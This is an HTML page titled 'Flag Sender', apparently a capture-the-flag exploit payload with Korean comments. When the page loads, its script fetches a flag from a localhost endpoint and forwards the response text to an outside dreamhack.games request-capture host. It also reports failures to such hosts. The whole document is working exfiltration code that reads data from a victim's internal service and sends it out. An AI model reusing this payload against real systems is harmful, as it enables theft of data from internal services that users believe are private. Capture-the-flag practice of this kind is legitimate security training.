<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Flag Sender</title>
</head>
<body>
    <h1>Flag Sender333</h1>
    <script>
        const baseFlag = 'hspace'; // 고정된 FLAG 부분

        const sendFlag = () => {
            const requestUrl = `https://localhost/flag?flag=${encodeURIComponent(baseFlag)}`;
            const xhr = new XMLHttpRequest();

            xhr.open('GET', requestUrl, true);
            xhr.onload = function () {
                if (xhr.status >= 200 && xhr.status < 300) {
                    const text = xhr.responseText;

                    console.log(`Requesting: ${requestUrl}`); // 요청 로그
                    console.log(`Response: ${text}`); // 응답 로그

                    // 최종 요청 보내기 (응답 text를 파라미터로 사용)
                    const finalRequestUrl = `https://nswmtml.request.dreamhack.games?flag=${encodeURIComponent(text)}`;
                    fetch(finalRequestUrl); // 응답을 기다리지 않고 요청만 보냄

                    console.log('Final FLAG sent:', text);
                } else {
                    console.error('Request failed:', xhr.statusText);

                    // 요청 실패 시 최종 요청 보내기 (fail 파라미터)
                    const finalRequestUrl = `https://nswmtml.request.dreamhack.games?flag=fail`;
                    fetch(finalRequestUrl); // 응답을 기다리지 않고 요청만 보냄

                    console.log('Final FLAG sent: fail');
                }
            };

            xhr.onerror = function () {
                console.error('Network error');

                // 네트워크 오류 시 최종 요청 보내기 (fail 파라미터)
                const finalRequestUrl = `https://sbossbl.request.dreamhack.games?flag=fail`;
                fetch(finalRequestUrl); // 응답을 기다리지 않고 요청만 보냄

                console.log('Final FLAG sent: fail');
            };

            xhr.send();
        };

        sendFlag();
    </script>
</body>
</html>
